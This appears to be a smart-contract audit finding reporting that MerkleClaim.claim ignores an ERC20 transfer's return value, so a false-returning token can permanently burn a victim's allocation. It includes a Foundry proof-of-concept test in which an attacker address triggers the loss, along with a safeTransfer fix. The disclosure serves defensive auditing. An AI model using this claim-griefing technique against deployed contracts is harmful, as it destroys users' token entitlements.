### Title
Unchecked ERC20 `transfer` return permanently burns Merkle allocations - ([File: contracts/MerkleClaim.sol](contracts/MerkleClaim.sol))

### Summary
`MerkleClaim.claim` marks an allocation as consumed before calling `IERC20Upgradeable.transfer`, but it ignores the transfer’s boolean return value. [1](#0-0)  If the configured token signals failure by returning `false` instead of reverting—for example because the distributor holds less than the claimed amount—the claimant is still recorded as paid while receiving nothing. [2](#0-1) 

### Finding Description
A successful Merkle proof only establishes that the submitted `(to, amount)` pair is included in `merkleRoot`; it does not make the distribution contract solvent. [3](#0-2)  After proof verification, the contract writes `hasClaimed[to] = true`, then performs a low-level ERC20 `transfer` without checking the returned boolean. [4](#0-3)  All subsequent calls revert through `AlreadyClaimed`, so the failed payout permanently consumes the entitlement. [5](#0-4) 

Unlike `DefaultDistributor.claim` and the credit-vault claim helpers, which use `safeTransfer`/`safeTransferFrom` and therefore revert on a false return, `MerkleClaim.claim` uses the raw interface directly. [6](#0-5) [7](#0-6) 

### Impact Explanation
An unprivileged caller can submit a victim’s valid Merkle claim while the contract’s token balance is below the entitled amount; for a non-reverting/false-returning token, the victim receives zero tokens and the full Merkle allocation becomes permanently unclaimable. [1](#0-0)  The quantified loss is the entire proven `amount`, and because `claim` accepts a separate `to` parameter, the victim does not need to initiate the transaction. [8](#0-7) 

The same unchecked return can leave later legitimate claims underfunded after a partial or failed payout, breaking the one-proof/one-payout invariant for every allocation. [1](#0-0) 

### Likelihood Explanation
The contract explicitly supports an arbitrary ERC20 configured at initialization, and its comment states that tokens are expected to be transferred to the distributor, but no minimum-balance check is performed during `claim`. [9](#0-8) [10](#0-9)  The trigger only requires a false-returning token and a contract balance lower than the proven amount; no privileged-role misbehavior is required. [1](#0-0) 

### Recommendation
Use `SafeERC20Upgradeable.safeTransfer` for the distribution payout, or explicitly decode/require the boolean result of `transfer`. [11](#0-10)  For additional defense, verify the Merkle allocation before setting `hasClaimed` remains safe under a reverting transfer; using `safeTransfer` is sufficient because a failed payout will roll back the claimed flag. [4](#0-3)  Apply the same handling to `sweep` so failed sweeps cannot return success while retaining the tokens. [12](#0-11) 

### Proof of Concept

The following Foundry test reproduces the issue on a fork or local Foundry environment; `FalseOnInsufficientToken` models an ERC20 that returns `false` instead of reverting when the distributor is underfunded.

```solidity
// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import { MerkleClaim } from "../contracts/MerkleClaim.sol";

contract FalseOnInsufficientToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (balanceOf[msg.sender] < amount) {
            return false;
        }

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MerkleClaimUncheckedTransferTest is Test {
    MerkleClaim internal distributor;
    FalseOnInsufficientToken internal token;

    address internal victim = address(0xB0B);
    address internal attacker = address(0xBAD);
    uint256 internal entitlement = 100 ether;

    function setUp() public {
        distributor = new MerkleClaim();
        token = new FalseOnInsufficientToken();

        bytes32 leaf = keccak256(
            bytes.concat(keccak256(abi.encode(victim, entitlement)))
        );
        distributor.initialize(leaf, address(token));

        // The distributor has only half of the proven entitlement.
        token.mint(address(distributor), 50 ether);
    }

    function testFalseReturningTransferConsumesClaimWithoutPaying() public {
        bytes32[] memory proof = new bytes32[](0);

        vm.prank(attacker);
        distributor.claim(victim, entitlement, proof);

        assertTrue(distributor.hasClaimed(victim));
        assertEq(token.balanceOf(victim), 0);
        assertEq(token.balanceOf(address(distributor)), 50 ether);

        vm.expectRevert(MerkleClaim.AlreadyClaimed.selector);
        distributor.claim(victim, entitlement, proof);
    }
}
```

The call completes because the ignored `transfer` result is `false`, yet `hasClaimed[victim]` remains true and the victim permanently loses the proven `100 ether` entitlement despite receiving no tokens. [1](#0-0)

```text
  /// @notice Allows claiming tokens if address is part of merkle tree
  /// @param to address of claimee
  /// @param amount of tokens owed to claimee
  /// @param proof merkle proof to prove address and amount are in tree
  function claim(address to, uint256 amount, bytes32[] calldata proof) external {
    // Throw if address has already claimed tokens
    if (hasClaimed[to]) revert AlreadyClaimed();

    // Verify merkle proof, or revert if not in tree,
    // double keccak is preferred https://github.com/OpenZeppelin/merkle-tree#user-content-fn-1-786ed85226485d53b8a7834b144c1642
    bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(to, amount))));
    bool isValidLeaf = MerkleProofUpgradeable.verify(proof, merkleRoot, leaf);
    if (!isValidLeaf) revert NotInMerkle();

    // Set address to claimed
    hasClaimed[to] = true;

    // Transfer tokens to claimee
    IERC20Upgradeable(token).transfer(to, amount);
```
